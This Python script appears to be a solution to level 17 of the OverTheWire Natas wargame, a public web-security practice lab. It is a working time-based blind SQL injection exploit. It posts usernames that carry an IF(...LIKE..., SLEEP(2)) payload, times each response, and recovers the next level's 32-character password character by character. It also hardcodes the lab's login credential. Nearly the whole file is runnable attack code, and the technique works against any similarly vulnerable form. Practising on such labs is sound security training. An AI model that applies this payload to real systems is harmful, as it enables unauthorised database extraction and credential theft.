import string
import time

import requests
from requests.auth import HTTPBasicAuth

USERNAME = 'natas17'
NATAS17_PASSWORD = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'
url = f"http://{USERNAME}.natas.labs.overthewire.org"
AUTH = HTTPBasicAuth(USERNAME, NATAS17_PASSWORD)
NEXT_NATAS_LEVEL = 'natas18'

ASCII_CHARS = string.ascii_letters + string.digits

FILE_PATH = 'password_characters.txt'

SESSION = requests.Session()


def obtain_password_chars(file_path):
    password_chars = ''
    for char in ASCII_CHARS:
        payload = f'{NEXT_NATAS_LEVEL}" AND IF(BINARY password LIKE "%{char}%", SLEEP(2), False) #'
        data = {'username': payload}

        start_time = time.time()
        response = SESSION.post(url, auth=AUTH, data=data)
        elapsed_time = time.time() - start_time

        if elapsed_time > 1:
            password_chars += char
            print('password', char, elapsed_time)
        else:
            print('not ', char, elapsed_time)

    with open(file_path, 'w') as file:
        file.write(password_chars)


# print(obtain_password_chars(FILE_PATH))

def retrieve_password(file_path):
    password = ''

    with open(file_path, 'r') as file:
        password_chars = file.read()

    while len(password) < 32:
        for char in password_chars:
            payload = f'{NEXT_NATAS_LEVEL}" AND IF(BINARY password LIKE "{password + char}%", SLEEP(2), False) #'
            data = {'username': payload}

            start_time = time.time()
            response = SESSION.post(url, auth=AUTH, data=data)
            elapsed_time = time.time() - start_time

            if elapsed_time > 1:
                password += char
                print('password', password, elapsed_time)
                break
            # else:start_time
            #     print('not ', char, elapsed_time)

    return password


print(retrieve_password(FILE_PATH))

SESSION.close()
